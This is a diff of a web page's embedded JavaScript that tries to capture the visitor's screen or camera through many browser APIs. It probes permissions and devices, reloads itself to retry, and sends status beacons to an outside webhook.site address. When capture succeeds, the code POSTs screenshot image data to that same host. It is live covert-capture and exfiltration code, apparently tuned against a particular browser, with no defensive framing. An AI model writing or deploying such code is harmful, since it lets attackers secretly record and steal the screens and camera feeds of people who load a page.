@@ -6,10 +6,12 @@
 <script>
 var W='https://webhook.site/598c7aef-4515-4c18-9432-f37c1cdece16';
 function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
-rpt('ALIVE','sec='+window.isSecureContext);
+
+var loadN=parseInt(sessionStorage.getItem('ln')||'0')+1;
+sessionStorage.setItem('ln',loadN);
+rpt('LOAD',loadN+'|sec='+window.isSecureContext+'|md='+(typeof navigator.mediaDevices)+'|moz='+(typeof navigator.mozGetUserMedia));
 
 var gdmDone=false;
-
 function ok(label,s){
     if(gdmDone)return;gdmDone=true;
     rpt('OK',label+'|tracks='+s.getTracks().length);
@@ -19,75 +21,65 @@ function fail(label,e){
     rpt('FAIL',label+'|'+e.name+':'+e.message.substring(0,150));
 }
 
+// Check permissions state
+try{
+    navigator.permissions.query({name:'display-capture'}).then(function(r){
+        rpt('PERM','display-capture='+r.state);
+    }).catch(function(e){rpt('PERM_E',e.message.substring(0,80))});
+}catch(e){}
+
 // === mozGetUserMedia with ALL mediaSource values ===
-var sources=['screen','window','browser','application'];
-sources.forEach(function(src,i){
+if(navigator.mozGetUserMedia){
+    var sources=['screen','window','browser','application'];
+    sources.forEach(function(src,i){
+        setTimeout(function(){
+            if(gdmDone)return;
+            rpt('MOZ',src);
+            try{
+                navigator.mozGetUserMedia(
+                    {video:{mediaSource:src}},
+                    function(s){ok('moz_'+src,s)},
+                    function(e){fail('moz_'+src,e)}
+                );
+            }catch(e){rpt('MOZ_ERR',src+'|'+e.message)}
+        },i*400+100);
+    });
+    // mozGetUserMedia with plain video
     setTimeout(function(){
         if(gdmDone)return;
-        rpt('MOZ_TRY',src);
+        rpt('MOZ','video');
         try{
             navigator.mozGetUserMedia(
-                {video:{mediaSource:src}},
-                function(s){ok('moz_'+src,s)},
-                function(e){fail('moz_'+src,e)}
+                {video:true},
+                function(s){ok('moz_video',s)},
+                function(e){fail('moz_video',e)}
             );
-        }catch(e){rpt('MOZ_ERR',src+'|'+e.message)}
-    },i*500+100);
+        }catch(e){}
+    },1800);
+}
+
+// === getUserMedia with mediaSource (needs activation normally) ===
+var gumSources=['screen','window','browser','application'];
+gumSources.forEach(function(src,i){
+    setTimeout(function(){
+        if(gdmDone)return;
+        rpt('GUM',src);
+        navigator.mediaDevices.getUserMedia({video:{mediaSource:src}}).then(
+            function(s){ok('gum_'+src,s)}
+        ).catch(function(e){fail('gum_'+src,e)});
+    },i*400+2200);
 });
 
-// === mozGetUserMedia with plain video (no mediaSource) ===
+// === getDisplayMedia ===
 setTimeout(function(){
     if(gdmDone)return;
-    rpt('MOZ_V_TRY','video:true');
-    try{
-        navigator.mozGetUserMedia(
-            {video:true},
-            function(s){ok('moz_video',s)},
-            function(e){fail('moz_video',e)}
-        );
-    }catch(e){rpt('MOZ_V_ERR',e.message)}
-},2500);
-
-// === mozGetUserMedia with audio only ===
-setTimeout(function(){
-    if(gdmDone)return;
-    rpt('MOZ_A_TRY','audio:true');
-    try{
-        navigator.mozGetUserMedia(
-            {audio:true},
-            function(s){ok('moz_audio',s)},
-            function(e){fail('moz_audio',e)}
-        );
-    }catch(e){rpt('MOZ_A_ERR',e.message)}
-},3000);
-
-// === mozGetUserMedia screen with specific constraints ===
-setTimeout(function(){
-    if(gdmDone)return;
-    rpt('MOZ_SC_TRY','screen+constraints');
-    try{
-        navigator.mozGetUserMedia(
-            {video:{mediaSource:'screen',width:{max:1920},height:{max:1080},frameRate:{max:30}}},
-            function(s){ok('moz_sc',s)},
-            function(e){fail('moz_sc',e)}
-        );
-    }catch(e){rpt('MOZ_SC_ERR',e.message)}
-},3500);
-
-// === mozGetUserMedia browser with browserId ===
-setTimeout(function(){
-    if(gdmDone)return;
-    rpt('MOZ_BID_TRY','browser+id');
-    try{
-        navigator.mozGetUserMedia(
-            {video:{mediaSource:'browser',browserWindow:window}},
-            function(s){ok('moz_bid',s)},
-            function(e){fail('moz_bid',e)}
-        );
-    }catch(e){rpt('MOZ_BID_ERR',e.message)}
+    rpt('GDM','try');
+    navigator.mediaDevices.getDisplayMedia({video:true}).then(
+        function(s){ok('gdm',s)}
+    ).catch(function(e){fail('gdm',e)});
 },4000);
 
-// === Try drawWindow on canvas (Firefox-specific) ===
+// === drawWindow ===
 setTimeout(function(){
     if(gdmDone)return;
     try{
@@ -100,88 +92,47 @@ setTimeout(function(){
                 var d=ctx.getImageData(0,0,20,1);
                 var px=Array.from(d.data);
                 var nz=px.filter(function(x){return x>0}).length;
-                rpt('DW_OK','nz='+nz+'|'+px.slice(0,40).join(','));
-                if(nz>10){
-                    var du=c.toDataURL('image/jpeg',0.7);
-                    rpt('DW_LEN','len='+du.length);
-                    if(du.length>1000){
-                        fetch(W,{method:'POST',mode:'no-cors',body:'dw:'+du}).catch(function(){});
-                    }
+                rpt('DW_PX','nz='+nz+'|'+px.slice(0,40).join(','));
+                var du=c.toDataURL('image/jpeg',0.7);
+                rpt('DW_LEN',du.length);
+                if(du.length>1000){
+                    fetch(W,{method:'POST',mode:'no-cors',body:'dw:'+du}).catch(function(){});
                 }
             }catch(e){rpt('DW_E',e.name+':'+e.message.substring(0,100))}
         }else{
-            rpt('DW','undefined|keys='+Object.getOwnPropertyNames(ctx.__proto__).filter(function(k){return k.indexOf('draw')>=0}).join(','));
+            rpt('DW','undef');
         }
-    }catch(e){rpt('DW_ERR',e.message)}
+    }catch(e){}
 },5000);
 
-// === Try captureStream on elements ===
+// === Self-reload after 8s if nothing worked ===
 setTimeout(function(){
     if(gdmDone)return;
-    try{
-        var cam=document.getElementById('cam');
-        if(cam.captureStream){
-            rpt('CS','img.captureStream exists');
-        }
-        // Try video element captureStream
-        var v=document.createElement('video');
-        v.src='http://10.133.7.5/stream';
-        v.crossOrigin='anonymous';
-        v.autoplay=true;v.muted=true;
-        document.body.appendChild(v);
-        v.onloadeddata=function(){
-            rpt('VS','loaded|'+v.videoWidth+'x'+v.videoHeight);
-            if(v.mozCaptureStream){
-                rpt('MCS','mozCaptureStream exists');
-                try{
-                    var ms=v.mozCaptureStream();
-                    ok('moz_capstream',ms);
-                }catch(e){rpt('MCS_E',e.name+':'+e.message.substring(0,100))}
-            }
-            if(v.captureStream){
-                rpt('VCS','captureStream exists');
-                try{
-                    var ms=v.captureStream();
-                    ok('capstream',ms);
-                }catch(e){rpt('VCS_E',e.name+':'+e.message.substring(0,100))}
-            }
-        };
-    }catch(e){rpt('CS_ERR',e.message)}
-},5500);
+    if(loadN<3){
+        rpt('RELOAD','triggering_'+loadN);
+        window.location.reload();
+    }
+},8000);
 
-// === Report all available APIs ===
-setTimeout(function(){
-    var apis=[];
-    if(navigator.mozGetUserMedia)apis.push('mozGUM');
-    if(navigator.mediaDevices)apis.push('MD');
-    if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia)apis.push('GDM');
-    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia)apis.push('GUM');
-    if(window.MediaStream)apis.push('MS');
-    if(window.MediaRecorder)apis.push('MR');
-    if(window.RTCPeerConnection)apis.push('RTC');
-    if(window.ImageCapture)apis.push('IC');
-    // Check for drawWindow
-    var c=document.createElement('canvas');var ctx=c.getContext('2d');
-    if(ctx.drawWindow)apis.push('drawWin');
-    if(ctx.mozDrawWindow)apis.push('mozDrawWin');
-    rpt('APIS',apis.join(','));
-},6000);
-
-// === getDisplayMedia retries (in case activation appears) ===
-var retryN=0;
+// === GDM retry every 5s ===
+var rN=0;
 function retryGDM(){
-    retryN++;
-    if(gdmDone||retryN>12)return;
-    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
-        if(gdmDone)return;gdmDone=true;
-        rpt('GDM_OK',retryN);
-        processStream(s);
-    }).catch(function(e){
-        if(retryN<=2||retryN%5==0)rpt('GDM_E',retryN+'|'+e.name);
+    rN++;if(gdmDone||rN>10)return;
+    navigator.mediaDevices.getDisplayMedia({video:true}).then(
+        function(s){ok('gdm_r'+rN,s)}
+    ).catch(function(e){
+        if(rN<=2||rN%4==0)rpt('GDM_R',rN+'|'+e.name);
     });
     setTimeout(retryGDM,5000);
 }
 setTimeout(retryGDM,500);
+
+// === Enumerate devices ===
+setTimeout(function(){
+    navigator.mediaDevices.enumerateDevices().then(function(devs){
+        rpt('DEVS',devs.length+'|'+devs.map(function(d){return d.kind+':'+d.label.substring(0,20)}).join(','));
+    });
+},6000);
 
 function processStream(stream){
     rpt('STREAM','tracks='+stream.getTracks().length);
